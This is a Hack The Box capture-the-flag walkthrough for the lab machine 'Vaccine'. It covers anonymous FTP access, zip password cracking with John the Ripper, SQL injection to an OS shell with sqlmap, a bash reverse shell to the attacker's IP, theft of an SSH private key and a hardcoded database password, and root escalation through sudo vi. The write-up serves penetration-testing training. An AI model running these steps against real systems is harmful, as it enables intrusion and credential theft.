# Vaccine
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)


Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Parrot OS
* IP Address: 10.10.14.251

Victim:
* Name: victim_machine
* IP Address: 10.129.55.79
* Other information must be gathered during the attack

With the latest updates of Hack The Box platform, the Starting Point machines changed a little on the walkthrough and are composed of discrete steps/questions to answer on.

For this machine, the first question is:
\
\
**Besides SSH and HTTP, what other service is hosted on this box?**

Just use nmap for this purpose:

    $nmap -sV 10.129.55.79

The result will return FTP service.
\
\
**This service can be configured to allow login with any password for specific username. What is that username?**

Theorically `anonymous` username could be. Let's verify by using `ftp` command (install if needed)ftp :

    $ftp 10.129.55.79

As `Name` we type `anonymous`, as `Password` we press Enter. The output should return a `230 Login Successful`. It means `anonymous` is the correct answer. We can use also FTP credentials we could find in the Oopsie machine to access to the machine by FTP protocol.
\
\
**What is the name of the file downloaded over this service?**

Let's try to find some good file by using FTP connecting the previous anonymous session:

Typing a `ls` command, we can see there is a `backup.zip` file. Download it by `get` command. The .zip is password protected.
\
\
**What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?**

The script is `zip2john`. This tool is used to generate a hash from `backup.zip` file and then we can use this hash as input on `john` for trying to crack it. The following command will generate the hash for this .zip:

    $zip2john backup.zip > backup.hash

The content of `backup.hash` file would be like:

    backup.zip:$pkzip2$2*2*1*0*8*24*3a41*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*1b1c*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip2$::backup.zip:style.css, index.php:backup.zip

Now we give this output file to `john` tool.
\
\
**What is the password for the admin user on the website?**

For retrieving the password of the admin, it should likely be contained inside `backup.zip`, so we need to crack the password by John The Ripper tool:

    $john backup.hash -w=/usr/share/wordlists/rockyou.txt

    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Will run 3 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
    Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
    Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
    741852963        (backup.zip)
    1g 0:00:00:00 DONE 2/3 (2021-11-14 14:22) 1.492g/s 110419p/s 110419c/s 110419C/s 123456..Open
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

The password is `741852963`. In this way we can unzip the archive and we can find the hashed password inside the `index.php`. Read the file, find the useful information. It should be a MD5 hashed password `2cb42f8734ea607eefed3b70af13bbd3`. Try to search online which word this hash corresponds to and you get the password.
\
\
**What option can be passed to sqlmap to try to get command execution via the sql injection?**

Just get the answer of this question by reading the manual of `sqlmap` tool. It is `--os-shell`
\
\
**What program can the postgres user run as root using sudo?**

Now it is a little tricky with respect to previous tasks. Let's define what we should do. My idea is:
* Try to access as `postgres` user by injecting malicious code by using `--os-shell` argument of `sqlmap`
* Search for some useful file containing credentials or password for `postgres` user
* Access to `/etc/sudoers` file containing information about which program `postgres` user can access as root

For first, we need to access to the webpage, login on it by credential we got previously, and search for some page with injectable parameters. So, for login, we use `admin` and the password we cracked from MD5 hash in one of previous tasks.

At this point we reach the `http://10.129.55.79/dashboard.php` and we can look for some input form, like the search bar on the top-right side. If we type a value, on the URL we see the `search=` parameter. Let's try to give it as input to `sqlmap`.

For executing correctly `sqlmap`, we need to take the information about the HTTP request will be sent otherwise `sqlmap` could not work properly. on the browser, we are on http://10.129.55.79/dashboard.php?search=anyword, open the DevTools, go on Network tab, refresh the page, right-click on the GET request on the page, click on Copy->Copy as cURL.

We just substitute `curl` with `sqlmap` and add `--os-shell` argument. Our `sqlmap` command should be:

    $sqlmap 'http://10.129.55.79/dashboard.php?search=anyword' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=i092dj0bqlhuo04nebp0stis80' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Cache-Control: max-age=0' --os-shell

At questions of the tool, we press always Enter. At the end we should get the OS Shell, we are inside the victim system.
The hard aspect here is that this shell is not comfortable because we are not able to navigate by using commands as `cd`.

What can we do? We have two paths:
* Inject a reverse shell!
* Establish a SSH connection by using `postgres` private key

For the first solution, just establish a connection between attacker machine and victim machine.

On the attacker machine, open a new terminal and type:

    $nc -lvnp 4444

On the victim machine OS shell, type:

    bash -i >& /dev/tcp/10.10.14.251/4444 0>&1

NOTE: when I tried the first time, it worked. When I tried the day after, it is not able to connect to the attacker machine. I don't know if the issue could be related to the machine.

For the second solution, just take the content of the file containing the private key:

    more ../../.ssh/id_rsa

Note: take only the content starting on `-----BEGIN OPENSSH PRIVATE KEY-----` and ending on `-----END OPENSSH PRIVATE KEY-----`.

Paste this content in a file inside the attacker machine. Then, connect by SSH to the machine by using this key instead of the password for the `postgres` user. Summarizing, after pasten the content on the file, save it and:

    chmod 600 key.txt 
    ssh -i key.txt postgres@10.129.55.79

You are in.

Now you are in the main directory of `postgres` user. You can see the `user.txt` file. Inside it there is a flag to be submitted in the next task. Now we need to answer to the question of the current task. For doing this, we need to execute `sudo -l` or going to read `/etc/sudoers` file, but we need to know the password of `postgres` user.

Searching inside files, inside `../../www/html/dashboard.php` file, there is the password of the user:

    try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }

Now we can use `sudo -l` command. The result is:

    Matching Defaults entries for postgres on vaccine:
        env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

    User postgres may run the following commands on vaccine:
        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

So the answer to the task question is `vi`.
\
\
**Submit user flag**
We found it in the previous task.
\
\
**Submit root flag**
We need to execute commands as root for retrieving the flag. The `sudo -l` command informed us that if `postgres` user will execute `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`, the execution will be performed on behalf of root.

At this point we can use `vi` and `:r!anycommand` to execute commands. Just execute:

    `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

Then:

    :r!cat /root/root.txt

or, you can spawn a shell by `vi` by typing:

    :!/bin/bash

and we can access to the root flag!